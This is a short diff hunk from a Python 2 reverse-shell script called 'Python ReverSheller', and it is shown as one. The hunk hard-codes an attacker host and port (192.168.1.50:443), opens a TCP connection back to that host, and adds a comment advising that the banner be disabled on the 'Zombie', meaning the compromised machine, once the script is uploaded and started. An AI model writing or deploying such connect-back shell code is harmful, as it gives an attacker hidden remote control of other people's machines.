@@ -18,9 +18,10 @@ import subprocess
 rhost = '192.168.1.50' # Set here different Host to connect
 rport =  443           # Set here different Port to connect
 
+## I recommend to disable Banner on Zombie when Is Uploaded & Started
 print "< Python ReverSheller V 1.0>" # Simple banner
 print "[+] Connection set on",rhost,":",rport #Print connection set on IP & Port
-print "[+] Running ..." #########################
+print "[+] Running ..." ######
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP_Socket_Variable
 s.connect((rhost , rport))                            # Socket_Connection on Global_Variables
